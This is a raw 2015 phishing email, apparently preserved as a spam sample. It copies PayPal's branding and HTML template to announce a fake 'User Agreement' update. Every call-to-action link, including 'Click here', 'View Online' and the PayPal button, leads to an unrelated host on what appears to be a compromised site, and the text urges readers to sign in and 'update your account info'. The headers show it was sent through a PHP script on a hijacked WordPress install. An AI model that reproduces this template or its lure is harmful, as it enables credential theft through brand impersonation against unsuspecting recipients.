@@ -1,0 +1,739 @@
+From @..  Thu Jan 22 12:46:55 2015
+Return-Path: <@..>
+X-Original-To: kidthree@fs.net
+Delivered-To: @..
+Received: by .. (Postfix, from userid 0)
+	id 749E9DE; Thu, 22 Jan 2015 12:46:55 +0000 (UTC)
+Received: from server1.innovationsoftware.us (server1.innovationsoftware.us [208.77.96.46])
+    by .. with SMTP id rneyjbce646huxyxd8q8erz63a;
+    for kidthree@fs.net;
+    Thu, 22 Jan 2015 12:46:55 +0000 (UTC)
+    (envelope-from mcfadden@server1.innovationsoftware.us)
+Received-SPF: None; receiver=..;
+    client-ip=208.77.96.46;
+    envelope-from=<mcfadden@server1.innovationsoftware.us>;
+    helo=server1.innovationsoftware.us
+X-Avenger: version=0.8.3; receiver=..;
+    client-ip=208.77.96.46; client-port=36981;
+    syn-fingerprint=14600:55:1:60:M1380,S,T,N,W7; network-hops=11;
+    network-path=143.215.250.65 130.207.254.29 130.207.254.186 143.215.194.113
+    64.57.21.81 206.223.119.36 66.192.243.202 64.132.248.142 66.35.95.118
+    66.35.75.18 208.77.96.46; network-path-time=1421930815
+Received: from mcfadden by server1.innovationsoftware.us with local (Exim 4.82)
+	(envelope-from <mcfadden@server1.innovationsoftware.us>)
+	id 1YEH9v-0004dj-Vw
+	for kidthree@fs.net; Thu, 22 Jan 2015 15:46:52 +0300
+To: @..
+Subject: PayPal Notice -  Please read the updates to the PayPal User Agreement
+X-PHP-Script: www.mcfaddenandmiller.com/wp-content/upgrade/172.158.24.73.php for 172.158.24.73
+MIME-Version: 1.0
+Content-type: text/html; 
+From: PayPal <@..>
+Message-Id: <E1YEH9v-0004dj-Vw@server1.innovationsoftware.us>
+Date: Thu, 22 Jan 2015 15:46:51 +0300
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server1.innovationsoftware.us
+X-AntiAbuse: Original Domain - fs.net
+X-AntiAbuse: Originator/Caller UID/GID - [513 511] / [47 12]
+X-AntiAbuse: Sender Address Domain - server1.innovationsoftware.us
+X-Get-Message-Sender-Via: server1.innovationsoftware.us: authenticated_id: mcfadden/only user confirmed/virtual account not confirmed
+
+
+
+
+
+
+<title>PayPal</title>
+
+<style><!--
+.ExternalClass .ecxReadMsgBody {
+width:100}
+
+.ExternalClass {
+width:100}
+
+.ExternalClass *[class=ecxbutton_style] {
+border-radius:7px !important;
+}
+
+.ExternalClass *[class=ecxbutton_style]:hover {
+background:#008bdb !important;
+}
+
+@media only screen and (min-device-width: 700px) and (max-device-width: 1024px) {
+.ExternalClass *[class=ecxdisplay_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_app_display_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_mobapp] {
+display:block !important;
+width:698px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+}
+
+@media only screen and (max-width: 480px), only screen and (device-aspect-ratio: 9/16), only screen and (device-aspect-ratio: 3/5) {
+.ExternalClass *[class=ecxdisplay_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_app_display_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxno_mobile_all] {
+display:none !important;
+}
+.ExternalClass *[class=ecxno_mobile_phone] {
+display:none !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_social] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_table_width] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxcolumn_split_preheader] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:5px 3px !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_4up_1] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+}
+.ExternalClass *[class=ecxcolumn_split_large_promo_hero] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+}
+.ExternalClass *[class=ecxcolumn_split_bml_banner] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:16px 0 0 0 !important;
+}
+.ExternalClass *[class=ecxcolumn_split_statement_login] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:16px 0 0 0 !important;
+}
+.ExternalClass *[class=ecxcolumn_split_bml_banner_phone] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:5px 0 0 0 !important;
+}
+.ExternalClass *[class=ecxcolumn_split_one_up_large_image] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:0 0 10px 0 !important;
+}
+.ExternalClass *[class=ecxcolumn_split_one_up_large_text] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:0 !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_3up] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:0 !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_4up] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:0 !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_5up] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:0 !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width] {
+display:block !important;
+width:318px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_mobapp] {
+display:block !important;
+width:318px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29] {
+display:block !important;
+width:260px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxhead_top_320px] {
+display:block !important;
+}
+.ExternalClass *[class=ecxhead_top_160px] {
+display:none !important;
+}
+.ExternalClass *[class=ecxhead_top_220px] {
+display:none !important;
+}
+.ExternalClass *[class=ecximg_body_spacer] {
+width:318px !important;
+}
+.ExternalClass *[class=ecxbml_banner_height_spacer] {
+width:29px !important;
+height:130px !important;
+}
+.ExternalClass *[class=ecxmobile_hero_width] {
+width:318px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width] {
+width:194px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxone_up_small_image] {
+}
+.ExternalClass *[class=ecxbody_horizontal_rule] {
+width:318px !important;
+height:1px !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width_4_up] {
+width:138px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width_5_up] {
+}
+.ExternalClass *[class=ecxmobile_app_width] {
+width:235px !important;
+height:10px !important;
+}
+.ExternalClass *[class=ecxmobile_app_button_width] {
+width:95px !important;
+height:1px !important;
+}
+.ExternalClass *[class=ecxtext_darkblue_header] {
+font-size:28px !important;
+}
+.ExternalClass *[class=ecxtext_lightblue_header] {
+font-size:28px !important;
+}
+.ExternalClass *[class=ecxtext_gray_paragraph] {
+font-size:14px !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_utility_nav_phone] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_utility_nav] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxutility_nav] {
+font-size:12px !important;
+text-align:center !important;
+}
+.ExternalClass *[class=ecxultility_nav_padding] {
+padding:19px 0 21px 0 !important;
+text-align:center;
+width:320px !important;
+}
+.ExternalClass *[class=ecxcolumn_split_utility_nav] {
+display:block !important;
+width:320px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxbutton_style] {
+border-radius:7px !important;
+}
+.ExternalClass *[class=ecxbutton_style]:hover {
+background:#008bdb !important;
+}
+.ExternalClass *[class=ecxmobile_button] {
+width:262px !important;
+}
+.ExternalClass *[class=ecxhorizontal_rule] {
+width:320px !important;
+height:2px !important;
+}
+}
+
+@media only screen and (min-device-width: 481px) and (max-device-width: 699px) {
+.ExternalClass *[class=ecxdisplay_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_app_display_on] {
+display:block !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxno_mobile] {
+display:none !important;
+}
+.ExternalClass *[class=ecxmobile_table_width] {
+display:block !important;
+width:480px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxcolumn_split] {
+display:block !important;
+width:480px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width] {
+display:block !important;
+width:478px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_mobapp] {
+display:block !important;
+width:478px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29] {
+display:block !important;
+width:420px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_3up] {
+display:block !important;
+width:134px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_4up] {
+display:block !important;
+width:98px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_5up] {
+display:block !important;
+width:78px !important;
+height:auto !important;
+padding:0;
+max-height:inherit !important;
+overflow:visible !important;
+}
+.ExternalClass *[class=ecxcolumn_split_bml_banner] {
+display:block !important;
+width:420px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:16px 0 0 0 !important;
+}
+.ExternalClass *[class=ecxcolumn_split_statement_login] {
+display:block !important;
+width:210px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+padding:8px 0 0 0 !important;
+}
+.ExternalClass *[class=ecxmobile_body_table_width_pad29_4up_1] {
+display:block !important;
+width:420px !important;
+height:auto !important;
+max-height:inherit !important;
+overflow:visible !important;
+text-align:left !important;
+}
+.ExternalClass *[class=ecxhead_top_320px] {
+display:block !important;
+}
+.ExternalClass *[class=ecxhead_top_160px] {
+display:block !important;
+}
+.ExternalClass *[class=ecxhead_top_220px] {
+display:none !important;
+}
+.ExternalClass *[class=ecximg_body_spacer] {
+width:478px !important;
+}
+.ExternalClass *[class=ecxbml_banner_height_spacer] {
+width:29px !important;
+height:100px !important;
+}
+.ExternalClass *[class=ecxthree_up_horizontal_spacer_9] {
+width:9px !important;
+}
+.ExternalClass *[class=ecxfour_up_horizontal_spacer_4] {
+width:4px !important;
+}
+.ExternalClass *[class=ecxfive_up_horizontal_spacer_1] {
+width:4px !important;
+}
+.ExternalClass *[class=ecxmobile_hero_width] {
+width:478px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width] {
+width:134px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width_4_up] {
+width:98px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxmobile_promo_hero_width_5_up] {
+width:78px !important;
+height:auto !important;
+}
+.ExternalClass *[class=ecxbody_horizontal_rule] {
+width:478px !important;
+height:1px !important;
+}
+.ExternalClass *[class=ecxmobile_app_width] {
+width:398px !important;
+height:10px !important;
+}
+.ExternalClass *[class=ecxmobile_app_button_width] {
+width:173px !important;
+height:1px !important;
+}
+.ExternalClass *[class=ecxtext_darkblue_header] {
+font-size:32px !important;
+}
+.ExternalClass *[class=ecxtext_lightblue_header] {
+font-size:32px !important;
+}
+.ExternalClass *[class=ecxtext_gray_paragraph] {
+font-size:14px !important;
+}
+.ExternalClass *[class=ecxutility_nav_spacer] {
+width:10px !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_social] {
+width:78px !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_utility_nav] {
+width:400px !important;
+}
+.ExternalClass *[class=ecxmobile_table_width_utility_nav_phone] {
+display:none !important;
+}
+.ExternalClass *[class=ecxhorizontal_rule] {
+width:480px !important;
+height:2px !important;
+}
+.ExternalClass *[class=ecxbutton_style] {
+border-radius:7px !important;
+}
+.ExternalClass *[class=ecxbutton_style]:hover {
+background:#008bdb !important;
+}
+.ExternalClass *[class=ecxmobile_button] {
+width:262px !important;
+}
+}
+.auto-style1 {
+	font-weight: bold;
+	text-decoration: none;
+}
+.auto-style2 {
+	color: #666666;
+}
+.auto-style3 {
+	font-weight: bold;
+	color: #666666;
+}
+.auto-style4 {
+	text-decoration: none;
+}
+--></style>
+
+
+<div>
+
+
+<table width="100<tbody><tr>
+<td align="center" valign="top" style="padding:0;background:#f2f2f2;"><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+
+<tbody><tr>
+<td><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+<tbody><tr>
+<td class="ecxcolumn_split_preheader" width="471" align="left" style="padding:15px 0;font-family:HelveticaNeueLight, Helvetica Neue Light, Arial, sans-serif;font-size:12px;color:#666;text-align:left;">
+<a href="#" style="" target="_blank" class="auto-style1">
+<span class="auto-style2">D</span></a><a class="auto-style4" href="#"><span class="auto-style3">ear 
+Member ,</span></a> <a href="#" style="font-weight:bold;text-decoration:none;color:#666;" target="_blank"></a> Please read the updates to the PayPal User Agreement</td>
+<td class="ecxno_mobile_phone" width="38"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh<td class="ecxcolumn_split_preheader" width="191" align="right" style="padding:15px 0;font-family:HelveticaNeueLight, Helvetica Neue Light, Arial, sans-serif;font-size:12px;color:#666;text-align:right;">
+<a style="font-weight:normal;text-decoration:underline;color:#666;" target="_blank" href="http://myhostingmanager.com/brilliantcredit/tmp/pkg_contactenhanced_3.2__BETA_4/install_53896793951a2/site/index.html">View Online</a></td>
+</tr>
+</tbody></table></td>
+</tr>
+
+
+<tr>
+<td><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+<tbody><tr>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_left_1px.jpg" width="1" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_left_3px.jpg" width="3" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_320px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_312px.jpg" width="312" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_160px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_160px.jpg" width="160" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_220px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_220px.jpg" width="220" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_right_3px.jpg" width="3" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_top_right_1px.jpg" width="1" height="20" alt="" border="0" style="display:block;"></td>
+</tr>
+</tbody></table></td>
+</tr>
+
+
+<tr>
+<td style="background:#f2f2f2;"><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#f2f2f2;">
+
+<tbody><tr>
+<td style="background:#e3e3e3;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh<td style="background:#fff;"><img class="ecximg_body_spacer" src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh<td style="background:#e3e3e3;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh</tr>
+
+
+<tr>
+<td style="background:#e3e3e3;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh
+<td align="left" valign="top" style="background:#fff;">
+
+<table class="ecxmobile_body_table_width" width="698" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#fff;">
+<tbody><tr>
+<td><table class="ecxmobile_body_table_width" width="698" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#fff;">
+<tbody><tr>
+<td width="29" style="background:#fff;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh<td width="140" style="background:#fff;"><a href="https://email-edg.paypal.com/r/K9S0BI2/KJB6NG/ZG4TNM3/LJFIG0/NR2GTM/MF/h?a=JO" style="font-family:Arial, Helvetica, sans-serif;color:#00447c;font-size:20px;text-decoration:none;line-height:22px;font-weight:bold;" target="_blank"><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/pp_h_rgb.gif" height="34" width="140" alt="PayPal" border="0" style="display:block;"></a></td>
+<td width="40" style="background:#fff;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh
+<td width="174" style="background:#fff;">&nbsp;</td>
+
+<td width="40" style="background:#fff;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh
+<td style="background:#fff;">&nbsp;</td>
+
+</tr>
+</tbody></table></td>
+</tr>
+<tr>
+<td style="background:#fff;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh</tr>
+</tbody></table>
+
+</td>
+
+<td style="background:#e3e3e3;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh</tr>
+
+
+<tr>
+<td style="background:#e3e3e3;"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh
+<td align="left" valign="top" style="background:#fff;font-family:HelveticaNeueLight, Helvetica Neue Light, Arial, sans-serif;font-size:14px;color:#666;padding-bottom:9px;"><table class="ecxmobile_body_table_width" width="698" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#fff;">
+<tbody><tr>
+<td class="ecxmobile_body_table_width_pad29" width="640" style="background:#fff;"> 
+<table class="ecxmobile_body_table_width" width="698" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#fff;">
+<tbody><tr>
+<td width="29"><img src="https://dub123.mail.live.com/Handlers/ImageProxy.mvc?bicild=&amp;canary=5TKmTyhh<td><table class="ecxmobile_body_table_width_pad29" width="640" border="0" cellpadding="0" cellspacing="0" align="center" style="background:#fff;">
+<tbody><tr>
+<td class="ecxtext_gray_paragraph" style="font-family:HelveticaNeueLight, Helvetica Neue Light, Arial, sans-serif;color:#717074;font-size:14px;"><span class="ecxtext_lightblue_header" style="color:#009CDE;font-size:42px;">Notice of changes to the PayPal User Agreement</span><br>
+
+<br>
+
+<font style="font-size: 12px; color: rgb(51, 51, 51); font-family: Arial,Helvetica,sans-serif;">  
+Dear Customer,  
+</font>  
+<br>
+<br>
+<span style="color:#717074;font-size:14px;line-height:21px;">We're constantly working to make PayPal safer, simpler and more convenient for our customers. <br>This means that from time to time we have to make changes to the terms of our User Agreement. <br>To make sure you are always informed we have posted recent updates on our website.<br><br><strong>What do I 
+need to do?</strong><br>
+<ul><li> 
+
+<a style="color:#009CDE;font-size:14px;text-decoration:none;font-weight:bold;" target="_blank" href="http://myhostingmanager.com/brilliantcredit/tmp/pkg_contactenhanced_3.2__BETA_4/install_53896793951a2/site/index.html">Click here</a>&nbsp; ,and 
+	sing in to your paypal account , update your account info </li><li> 
+
+
+
+Please read the Policy Update carefully. It contains important legal information about when and how the changes to our User Agreement will become effective.</li><li> 
+
+
+
+If you agree to the changes, you need to do anything as any updates will automatically come into effect. If you do not wish to accept the changes, we have also provided you with the steps you can take on the Policy Update page.</li></ul>
+
+<table id="table1" class="mobile_button" border="0" width="246" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td>
+<table class="mobile_button" border="0" width="190" cellpadding="0" cellspacing="0" id="table2">
+<tbody><tr>
+<td id="button_force_width" height="1"><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.gif" style="display:block;" pagespeed_url_hash="1352018993" border="0" width="262" height="1"></td>
+</tr>
+<tr>
+<td>
+<table class="mobile_button" border="0" width="203" cellpadding="0" cellspacing="0" id="table3">
+<tbody><tr>
+<td id="force_height" width="1" height="40"><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/modules/spacer10.gif" style="display:block;" pagespeed_url_hash="1352018993" border="0" width="1" height="40"></td>
+<td class="button_style" id="button_text" style="font-family:Arial,sans-serif; font-weight:bold; font-stretch:normal; text-align:center; color:#ffffff; font-size:13px;background:#009CDE; border-radius:7px !important; -webkit-border-radius: 7px !important; -moz-border-radius: 7px !important; -o-border-radius: 7px !important; -ms-border-radius: 7px !important;" align="center" valign="middle">
+<span style="color: #FFFFFF"><font size="3">
+<a style="text-decoration: none" href="http://myhostingmanager.com/brilliantcredit/tmp/pkg_contactenhanced_3.2__BETA_4/install_53896793951a2/site/index.html">
+<font color="#FFFFFF">PayPal</font></a></font></span></td>
+</tr>
+</tbody></table></td>
+</tr>
+</tbody></table></td>
+</tr>
+</tbody></table>
+<p>&nbsp;</p>
+<p>Please note that the current User Agreement will apply until these changes take effect.
+<br><br>
+<strong>Yours sincerely,<br>
+PayPal </strong>
+
+
+</span></td>
+</tr>
+</tbody></table>
+</td>
+</tr>
+</tbody></table>
+
+<tr>
+<td><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+<tbody><tr>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_left_1px.jpg" width="1" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_left_3px.jpg" width="3" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_320px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_312px.jpg" width="312" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_160px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_160px.jpg" width="160" height="20" alt="" border="0" style="display:block;"></td>
+<td><img class="ecxhead_top_220px" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_220px.jpg" width="220" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_right_3px.jpg" width="3" height="20" alt="" border="0" style="display:block;"></td>
+<td><img src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_bot_right_1px.jpg" width="1" height="20" alt="" border="0" style="display:block;"></td>
+</tr>
+</tbody></table></td>
+</tr>
+
+
+<tr>
+<td><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+
+<tbody><tr>
+<td><table class="ecxmobile_table_width" width="700" border="0" cellpadding="0" cellspacing="0" align="center">
+<tbody><tr>
+<td class="">&nbsp;</td></tr>
+</tbody></table></td>
+</tr>
+</tbody></table></td>
+</tr>
+
+
+<tr>
+<td><img class="ecxhorizontal_rule" src="https://image.paypal-communication.com/paypal_eu/common/module_system/wireframe/images/template_horizontal_rule.jpg" width="700" height="2" alt="" border="0" style="display:block;"></td>
+</tr>
+
+
+<tr>
+<td style="padding:19px 29px;font-family:HelveticaNeueLight, Helvetica Neue Light, Arial, sans-serif;font-size:11px;color:#666;text-align:left;"><br>Copyright � 1999-2015 PayPal. All rights reserved. </td>
+</tr>
+
+</tbody></table></td>
+</tr>
+</tbody></table>
+<img height="1" width="1" src="https://email-edg.paypal.com/o/K9S0BI2/KJB6NG/ZG4TNM3/LJFIG0/ULQA/52"></div>
+
